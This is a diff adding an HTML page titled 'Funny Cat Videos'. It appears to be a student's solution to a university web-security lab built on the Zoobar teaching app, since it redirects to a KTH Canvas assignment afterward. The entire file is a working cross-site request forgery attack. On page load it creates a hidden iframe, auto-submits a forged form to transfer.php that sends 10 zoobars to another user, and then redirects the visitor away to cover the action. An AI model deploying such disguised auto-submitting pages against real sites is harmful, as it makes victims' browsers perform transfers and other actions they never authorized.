@@ -1,0 +1,31 @@
+HTML
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Funny Cat Videos</title>
+  <script type="text/javascript">
+    function executeAttack() {
+      const iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
+      iframe.contentDocument.write(`
+        <form id='csrf-form' action='http://zoobar/transfer.php' method='POST'>
+          <input type='hidden' name='zoobars' value='10'>
+          <input type='hidden' name='recipient' value='user'>
+          <input type='hidden' name='submission' value='Send'>
+        </form>
+      `);
+      iframe.contentDocument.getElementById('csrf-form').submit();
+    }
+    window.onload = function() {
+      executeAttack();
+      setTimeout(function(){
+        window.location.href = "https://canvas.kth.se/courses/41424/assignments/256229";
+      })
+    };
+  </script>
+</head>
+<body>
+  <h1>Random strings</h1>
+</body>
+</html>
